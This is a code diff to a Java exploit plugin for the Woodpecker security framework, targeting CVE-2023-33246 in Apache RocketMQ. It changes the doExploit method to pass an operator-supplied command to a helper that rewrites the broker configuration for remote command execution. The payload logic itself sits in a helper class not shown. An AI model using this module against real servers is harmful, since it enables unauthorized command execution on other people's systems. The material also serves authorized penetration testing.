@@ -1,7 +1,13 @@
 package me.gv7.woodpecker.vuldb;
 
 import me.gv7.woodpecker.plugin.*;
+import org.apache.rocketmq.client.exception.MQBrokerException;
+import org.apache.rocketmq.client.exception.MQClientException;
+import org.apache.rocketmq.remoting.exception.RemotingConnectException;
+import org.apache.rocketmq.remoting.exception.RemotingSendRequestException;
+import org.apache.rocketmq.remoting.exception.RemotingTimeoutException;
 
+import java.io.UnsupportedEncodingException;
 import java.util.ArrayList;
 import java.util.List;
 import java.util.Map;
@@ -34,9 +40,14 @@ public class CVE_2023_33246_PayloadGenerator implements IExploit {
     }
 
     @Override
-    public void doExploit(ITarget iTarget, Map<String, Object> customArgs, IResultOutput iResultOutput) throws Throwable {
+    public void doExploit(ITarget iTarget, Map<String, Object> customArgs, IResultOutput iResultOutput) throws Throwable, RemotingConnectException, RemotingSendRequestException, RemotingTimeoutException, MQBrokerException, UnsupportedEncodingException, InterruptedException, MQClientException {
         String  command = (String) customArgs.get("command");
-        String  address =  iTarget.getAddress();
+        String host = iTarget.getHost();
+        int port = iTarget.getPort();
+        String address = host + ":" + port;
+
+        iResultOutput.infoPrintln("command: " + command);
+        iResultOutput.infoPrintln("address: " + address);
 
         CVE_2023_33246_Utils.updateConfig(address, CVE_2023_33246_Utils.getCmd(command));
         iResultOutput.infoPrintln(CVE_2023_33246_Utils.rocketmqHome);
